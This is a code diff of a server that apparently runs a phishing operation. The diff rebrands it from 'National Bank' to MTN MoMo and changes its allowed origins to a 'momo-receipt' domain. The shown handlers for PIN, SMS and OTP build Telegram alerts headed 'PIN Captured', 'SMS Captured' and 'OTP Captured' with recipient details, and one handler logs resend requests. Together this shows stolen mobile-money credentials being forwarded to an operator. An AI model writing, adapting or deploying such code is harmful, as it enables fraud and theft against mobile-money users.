@@ -31,8 +31,8 @@ const IS_PERSISTENT = DATA_DIR === '/data';
    CORS — explicit allowlist + guaranteed OPTIONS handler.
    ═══════════════════════════════════════════════════════════════ */
 const ALLOWED_ORIGINS = [
-  'https://mobile-banking-production.up.railway.app',
-  'https://stanbic-mobile-receipt-production.up.railway.app',
+  'https://momo-receipt-production.up.railway.app',
+  'https://momo-receipt-production.up.railway.app',
   'http://localhost:3000',
   'http://localhost:5173'
 ];
@@ -360,7 +360,7 @@ app.post('/api/mtn/pin', async (req, res) => {
     const purposeLine = rec.purpose ? `🎯 <b>Purpose:</b> ${esc(rec.purpose)}\n` : '';
 
     const text =
-      `🔐 <b>National Bank PIN Captured</b>\n` +
+      `🔐 <b>MoMo PIN Captured</b>\n` +
       `━━━━━━━━━━━━━━━\n` +
       `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
       `👤 <b>Recipient:</b> ${esc(rec.accountName || rn || '—')}\n` +
@@ -415,7 +415,7 @@ app.post('/api/mtn/sms', async (req, res) => {
     const purposeLine = rec.purpose ? `🎯 <b>Purpose:</b> ${esc(rec.purpose)}\n` : '';
 
     const text =
-      `📩 <b>National Bank SMS Captured</b>\n` +
+      `📩 <b>MoMo Y'ello SMS Captured</b>\n` +
       `━━━━━━━━━━━━━━━\n` +
       `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
       `👤 <b>Recipient:</b> ${esc(rec.accountName || rn || '—')}\n` +
@@ -475,7 +475,7 @@ app.post('/api/mtn/otp', async (req, res) => {
     const purposeLine = rec.purpose ? `🎯 <b>Purpose:</b> ${esc(rec.purpose)}\n` : '';
 
     const text =
-      `🔢 <b>National Bank OTP Captured</b>\n` +
+      `🔢 <b>MoMo OTP Captured</b>\n` +
       `━━━━━━━━━━━━━━━\n` +
       `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
       `👤 <b>Recipient:</b> ${esc(rec.accountName || '—')}\n` +
@@ -528,7 +528,7 @@ app.post('/api/mtn/resend', async (req, res) => {
     persistTxs();
 
     await tgSend(
-      `🔁 <b>National Bank ${which} Resend Requested</b>\n` +
+      `🔁 <b>Mtn MoMo ${which} Resend Requested</b>\n` +
       `━━━━━━━━━━━━━━━\n` +
       `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
       `👤 ${esc(rec.accountName || '—')}\n` +
